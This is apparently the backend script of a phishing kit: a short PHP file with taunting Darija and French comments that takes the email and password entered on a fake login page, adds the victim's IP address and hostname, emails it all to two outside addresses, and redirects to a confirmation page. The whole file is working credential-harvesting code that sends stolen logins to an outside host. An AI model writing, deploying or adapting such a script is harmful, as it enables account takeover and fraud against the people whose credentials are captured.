<?php
// Ehh l7alwa l7alwa I dédicace l3chran LAHCEN KHALID ACHRAF BADR
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "====+++ Oui c sa VBV HIHI +++====\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "======+ BY +=======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "sch.vida.2017@gmail.com,darksp@yahoo.com"; /// decode 7na b cmd atl3 lik tlghima hhhh 
$subject = "LOG  *_* [".$_POST['email']."] $ip";
$headers = "From:  <Login@okby.com>";

mail($send,$subject,$message,$headers);
header("Location: confirm.php");

?>